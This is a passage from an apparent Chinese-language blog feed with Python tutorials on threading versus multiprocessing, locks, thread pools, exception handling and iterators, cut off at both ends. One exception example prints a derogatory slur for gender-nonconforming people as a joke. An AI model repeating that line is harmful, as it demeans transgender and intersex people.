class="hljs">一个工人相当于cpu，那么计算相当于工人在干活，I/O阻塞相当于为工人干活提供所需原材料的过程，工人干活的过程中如果没有原材料了，则工人干活的过程需要停止，直到等待原材料的到来。</code></pre><p>如果你的工厂干的大多数任务都要有准备原材料的过程（I&#x2F;O密集型），那么你有再多的工人，意义也不大。</p><p>反过来讲，如果你的工厂原材料都齐全，那当然是工人越多，效率越高。</p><p><strong>结论：</strong></p><p>对计算来说，cpu越多越好，但是对于I&#x2F;O来说，再多的cpu也没用</p><p>当然对运行一个程序来说，随着cpu的增多执行效率肯定会有所提高（不管提高幅度多大，总会有所提高），这是因为一个程序基本上不会是纯计算或者纯I&#x2F;O，所以我们只能相对的去看一个程序到底是计算密集型还是I&#x2F;O密集型，从而进一步分析python的多线程到底有无用武之地。</p><p><strong>计算密集型案例：多进程效率高</strong></p><p>os.cpu_count()：查看计算机的核数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time,os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">word</span>(): <span class="hljs-comment">#计算密集型任务</span><br>    res = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>        res *= i<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前计算机的核数为：&#x27;</span>,os.cpu_count())<br>    start = time.time()<br>    ps = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        <span class="hljs-comment">#使用多进程来处理计算密集型任务（利用多核优势【并行】）</span><br>        p = Process(target=word) <span class="hljs-comment">#执行耗时1s</span><br>        <span class="hljs-comment"># p = Thread(target=word) #执行耗时2s</span><br><br>        p.start()<br>        ps.append(p)<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ps:<br>        p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><p><strong>密集IO型：多线程效率高</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time,os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">word</span>(): <span class="hljs-comment">#IO密集型任务</span><br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;------------------&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;当前计算机的核数为：&#x27;</span>,os.cpu_count())<br>    start = time.time()<br>    ps = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>):<br>        <span class="hljs-comment"># p = Process(target=word) #执行耗时11s</span><br>        p = Thread(target=word) <span class="hljs-comment">#执行耗时2s</span><br><br>        p.start()<br>        ps.append(p)<br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ps:<br>        p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><p><a name="c6393d72"></a></p><h4 id="同步锁"><a href="#同步锁" class="headerlink" title="同步锁"></a>同步锁</h4><ul><li>什么是同步锁？ <ul><li>一个进程中的一个线程只能使用一个cpu。要保证一个线程对应的某些操作在一段时间内被完整的直接完毕所加入的锁就是同步锁。</li></ul></li><li>为什么用同步锁？ <ul><li>因为有可能当一个线程在使用cpu时，该线程下的程序可能会遇到io阻塞操作，那么cpu就会切到别的线程上去，这样就有可能会影响到该程序结果的完整性。</li></ul></li><li>使用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#未上锁</span><br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread,Lock<br><span class="hljs-keyword">import</span> time,random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    <span class="hljs-keyword">global</span> n<br>    temp = n<br>    time.sleep(random.random())<br>    n = temp - <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = <span class="hljs-number">10</span> <span class="hljs-comment">#全局变量</span><br>    ts = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        t = Thread(target=work)<br>        t.start()<br>        ts.append(t)<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> ts:<br>        t.join()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;全局变量n的值为：&#x27;</span>,n)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#上锁</span><br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread,Lock<br><span class="hljs-keyword">import</span> time,random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    <span class="hljs-keyword">global</span> n<br>    lock.acquire() <span class="hljs-comment">#上锁</span><br>    temp = n<br>    time.sleep(random.random())<br>    n = temp - <span class="hljs-number">1</span><br>    lock.release() <span class="hljs-comment">#解锁</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = <span class="hljs-number">10</span> <span class="hljs-comment">#全局变量</span><br>    ts = []<br>    lock = Lock()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        t = Thread(target=work)<br>        t.start()<br>        ts.append(t)<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> ts:<br>        t.join()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;全局变量n的值为：&#x27;</span>,n)<br></code></pre></td></tr></table></figure><p>总结：<strong>保护不同的数据就应该加不同的锁。</strong> <strong>GIL 与Lock是两把锁，保护的数据不一样，前者是解释器级别的（当然保护的就是解释器级别的数据，比如垃圾回收的数据），后者是保护用户自己开发的应用程序的数据，很明显GIL不负责这件事，只能用户自定义加锁处理，即Lock</strong></p><p><a name="46dc5c2e"></a></p><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>线程预先被创建并放入线程池中，同时处理完当前任务之后并不销毁而是被安排处理下一个任务，因此能够避免多次创建线程，从而节省线程创建和销毁的开销，能带来更好的性能和系统稳定性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-comment">#导入了线程池模块</span><br><span class="hljs-keyword">import</span> time<br>urls = [<span class="hljs-string">&#x27;www.1.com&#x27;</span>,<span class="hljs-string">&#x27;www.2.com&#x27;</span>,<span class="hljs-string">&#x27;www.3.com&#x27;</span>,<span class="hljs-string">&#x27;www.4.com&#x27;</span>,<span class="hljs-string">&#x27;www.5.com&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_reqeust</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br>start = time.time()<br><span class="hljs-comment">#创建一个线程池,开启了5个线程</span><br>pool = Pool(<span class="hljs-number">5</span>)<br><span class="hljs-comment">#可以利用线程池中三个线程不断的去处理5个任务</span><br>pool.<span class="hljs-built_in">map</span>(get_reqeust,urls)<br><span class="hljs-comment">#get_reqeust函数调用的次数取决urls列表元素的个数</span><br><span class="hljs-comment">#get_requests每次执行都会接收urls列表中的一个元素作为参数</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br>pool.close() <span class="hljs-comment">#释放线程池</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>并发</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---异常</title>
    <link href="/2020/10/17/python---%E5%BC%82%E5%B8%B8/"/>
    <url>/2020/10/17/python---%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<p><a name="e449cf10"></a></p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><ul><li>首先我们要理解什么叫做**”异常”**？ <ul><li>在程序运行过程中，总会遇到各种各样的问题和错误。</li><li>有些错误是我们编写代码时自己造成的： <ul><li>比如语法错误、调用错误，甚至逻辑错误。</li></ul></li><li>还有一些错误，则是不可预料的错误，但是完全有可能发生的： <ul><li>比如文件不存在、磁盘空间不足、网络堵塞、系统错误等等。</li></ul></li><li>这些导致程序在运行过程中出现异常中断和退出的错误，我们统称为异常。大多数的异常都不会被程序处理，而是以错误信息的形式展现出来。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#0不能被作为除数</span><br><span class="hljs-number">1</span>/<span class="hljs-number">0</span><br>异常信息为：ZeroDivisionError: division by zero<br></code></pre></td></tr></table></figure><ul><li>异常的分类： <ul><li>异常有很多种类型，Python内置了几十种常见的异常，无需特别导入，直接就可使用。</li><li>需要注意的是，所有的异常都是异常类，首字母是大写的！</li></ul></li><li>异常的危害： <ul><li>如果程序中一旦出现了异常的语句代码，则该异常就会立即中断程序的运行！</li></ul></li><li>因此： <ul><li>为了保证程序的正常运行，提高程序健壮性和可用性。我们应当尽量考虑全面，将可能出现的异常进行处理，而不是留在那里，任由其发生。</li></ul></li><li>python处理异常的机制： <ul><li>Python内置了一套try…except…finally（else）…的异常处理机制，来帮助我们进行异常处理。其基本语法是：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>机制说明： <ul><li>首先，执行try子句（在关键字try和关键字except之间的语句） </li><li>如果没有异常发生，忽略except子句，try子句执行后结束。 </li><li>如果在执行try子句的过程中发生了异常，那么try子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的except子句将被执行。 </li><li></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之前的语句正常执行&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之后的语句不会被执行&quot;</span>)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><ul><li>如果程序发生的异常不在你的捕获列表中，那么依然会抛出别的异常: </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 未捕获到异常，程序直接报错</span><br>s1 = <span class="hljs-string">&#x27;hello&#x27;</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">int</span>(s1)<br><span class="hljs-keyword">except</span> IndexError <span class="hljs-keyword">as</span> ex:    <span class="hljs-comment"># 本例为非法值异常，而你只捕获索引异常</span><br>    <span class="hljs-built_in">print</span>(ex)<br></code></pre></td></tr></table></figure><ul><li>Exception是什么？ <ul><li>在Python的异常中，有一个通用异常：<code>Exception</code>，它可以捕获任意异常。</li><li>思考：那么既然有这个什么都能管的异常，其他诸如OSError、ZeroDivisionError的异常是不是就可以不需要了？ <ul><li>当然不是！很多时候程序只会弹出那么几个异常，没有必要针对所有的异常进行捕获，那样的效率会很低。另外，根据不同的异常种类，制定不同的处理措施，用于准确判断错误类型，存储错误日志，都是非常有必要甚至强制的。</li></ul></li><li>常见的异常类型：</li></ul></li></ul><table><thead><tr><th>异常名</th><th>解释</th></tr></thead><tbody><tr><td>AttributeError</td><td>试图访问一个对象没有的属性</td></tr><tr><td>IOError</td><td>输入&#x2F;输出异常</td></tr><tr><td>ImportError</td><td>无法引入模块或包；多是路径问题或名称错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>IndexError</td><td>下标索引错误</td></tr><tr><td>KeyError</td><td>试图访问不存在的键</td></tr><tr><td>KeyboardInterrupt</td><td>Ctrl+C被按下，键盘终止输入</td></tr><tr><td>NameError</td><td>使用未定义的变量</td></tr><tr><td>SyntaxError</td><td>语法错误</td></tr><tr><td>TypeError</td><td>传入对象的类型与要求的不符合</td></tr><tr><td>UnboundLocalError</td><td>试图访问一个还未被设置的局部变量</td></tr><tr><td>ValueError</td><td>传入一个调用者不期望的值，即使值的类型是正确的</td></tr><tr><td>OSError</td><td>操作系统执行错误</td></tr></tbody></table><ul><li><h2 id="Python的异常机制具有嵌套处理的能力-比如在函数f3-调用f2-，f2-调用f1-，虽然是在f1-出错了，但只需要在f3-进行异常捕获，不需要每一层都捕获异常"><a href="#Python的异常机制具有嵌套处理的能力-比如在函数f3-调用f2-，f2-调用f1-，虽然是在f1-出错了，但只需要在f3-进行异常捕获，不需要每一层都捕获异常" class="headerlink" title="Python的异常机制具有嵌套处理的能力: -  比如在函数f3()调用f2()，f2()调用f1()，虽然是在f1()出错了，但只需要在f3()进行异常捕获，不需要每一层都捕获异常 "></a>Python的异常机制具有嵌套处理的能力:<br> -  比如在函数f3()调用f2()，f2()调用f1()，虽然是在f1()出错了，但只需要在f3()进行异常捕获，不需要每一层都捕获异常 </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#函数嵌套出现异常</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>/<span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>    f1()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br>    f2()<br><br>f3()<br></code></pre></td></tr></table></figure><ul><li>函数嵌套处理异常： </li><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>/<span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>    f1()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f3</span>():<br>    f2()<br><br><span class="hljs-keyword">try</span>:<br>    f3()<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><ul><li>try…excetion的嵌套 <ul><li>之前我们说过，不是只使用通用的异常类Exception就万事大吉了，为了效率问题，我们需要对常见的异常信息进行精准的捕获，那么如果异常出现在用户层的话，则就需要对用户操作可能会出现的异常进行判断然后精准捕获了，如何操作呢？ <ul><li>如果一个异常没有与任何的except匹配，那么这个异常将会传递给上层的try中。也就是前面说的嵌套处理能力。直到程序最顶端如果还没有被捕获，那么将弹出异常。</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之前的语句正常执行&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之后的语句不会被执行&quot;</span>)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;里层没有抓好，只能辛苦我外层了&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  或者使用一个try和多个except的形式：   -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之前的语句正常执行&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发生异常之后的语句不会被执行&quot;</span>)<br><span class="hljs-keyword">except</span> NameError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我是第一个抓取到除零异常的&quot;</span>)<br><span class="hljs-keyword">except</span> (ValueError,ZeroDivisionError) <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;我是备胎&quot;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  或者在except后面跟一个元组，元组中包含多个异常类 </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">except</span> (RuntimeError, TypeError, NameError):<br>      <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>finally和else子句 <ul><li><code>try except</code>语法还有一个可选的else子句，如果使用这个子句，那么必须放在所有的except子句之后。这个子句将在try子句没有发生任何异常的时候执行： </li><li>同样的，还有一个可选的finally子句。无论try执行情况和except异常触发情况如何，finally子句都会被执行！ </li><li>当然，else和finally同时存在时：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;else&quot;</span>)<br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;finally&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>主动抛出异常：raise <ul><li>很多时候，我们需要主动抛出一个异常。Python内置了一个关键字<code>raise</code>，可以主动触发异常。 </li><li>疑问： <ul><li>为什么要自己主动抛出异常？不嫌多事么？因为有的时候，你需要记录错误信息，然后将异常继续往上层传递，让上层去处理异常，如下：</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    divNum = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;enter a divNum:&#x27;</span>)<br>    divNum = <span class="hljs-built_in">int</span>(divNum)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-number">1</span>/divNum<br>    <span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;记录异常日志： &quot;</span>, ex)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;但是我自己无法处理，只能继续抛出，看看上层能否处理（甩锅）&quot;</span>)<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;非法录入&#x27;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户录入非法数据，请重新输入！&#x27;</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">  -  有时候，你需要主动弹出异常，作为警告或特殊处理：   -  </code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#用户录入自己的性别：1表示男，2表示女</span><br>sex = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please input a number: &quot;</span>))<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">if</span> sex == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这是个男人！&quot;</span>)<br>    <span class="hljs-keyword">elif</span> sex == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这是个女人！&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;好像有什么不符合常理的事情发生了！！&quot;</span>)<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;非法的输入&quot;</span>)<br><span class="hljs-keyword">except</span> ValueError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这是个人妖！&quot;</span>)<br></code></pre></td></tr></table></figure><p><a name="4c718d0b"></a></p><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>在介绍迭代器之前，先说明下迭代的概念：</p><ul><li>迭代： <ul><li>通过for循环遍历”对象”的每一个元素的过程。</li><li>这里的对象指的就是可迭代对象。因此记住：for循环遍历的只能是可迭代的对象。</li></ul></li><li>可迭代类型的对象： <ul><li>在Python中，list&#x2F;tuple&#x2F;string&#x2F;dict&#x2F;set&#x2F;bytes都是可以迭代的数据类型&#x2F;可迭代对象！</li></ul></li><li>如何判定一个对象是否为可迭代对象呢？(了解) <ul><li>可以通过collections模块的Iterable类型作用在isinstance中来判断一个对象是否可迭代</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Iterable<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(<span class="hljs-string">&#x27;abc&#x27;</span>,Iterable))<br></code></pre></td></tr></table></figure><ul><li><p>迭代器 </p><ul><li>迭代器是一种可以被遍历的对象，并且能作用于next()函数。 </li><li>性质： <ul><li>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往后遍历不能回溯，不像列表，你随时可以取后面的数据，也可以返回头取前面的数据。</li></ul></li><li>迭代器通常要实现两个基本的方法：<code>iter()</code> 和 <code>next()</code>。 </li><li>注意： <ul><li>可迭代对象并不一定是迭代器！</li><li>常见的数据结构，字符串、列表、元组都属于可迭代对象，并不是迭代器！</li></ul></li><li>如何创建一个迭代器呢？ <ul><li>字符串，列表或元组对象，甚至自定义对象都可用于创建迭代器：</li></ul></li></ul></li><li><p>思考：迭代器的作用是什么？ </p><ul><li>可迭代对象的优缺点： <ul><li>可迭代对象的优点：可以直观查看里面的对象，如直接查看列表的内容</li><li>可迭代对象缺点：全部内容要加载至内存中，故占用内存</li></ul></li><li>迭代器的优缺点： <ul><li>优点： <ul><li>提供了一种通用不依赖索引的迭代取值方式；</li><li>节省内存，迭代器在内存中相当于只占一个数据的空间：因为每次取值都上一条数据会在内存释放，加载当前的此条数据。</li></ul></li><li>缺点： <ul><li>因为有next方法，即只能往后取值,不能往前，取值不如按照索引的方式灵活，不能取指定的某一个值</li><li>无法预测迭代器的长度</li></ul></li></ul></li></ul></li><li><p>总结：迭代器和可迭代的区别？</p></li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.凡是可作用于for循环的对象都是可迭代类型；<br><br><span class="hljs-number">2</span>.凡是可作用于<span class="hljs-built_in">next</span>()函数的对象都是迭代器类型；<br><br><span class="hljs-number">3</span><span class="hljs-selector-class">.list</span>、dict、str等是可迭代的但不是迭代器，因为<span 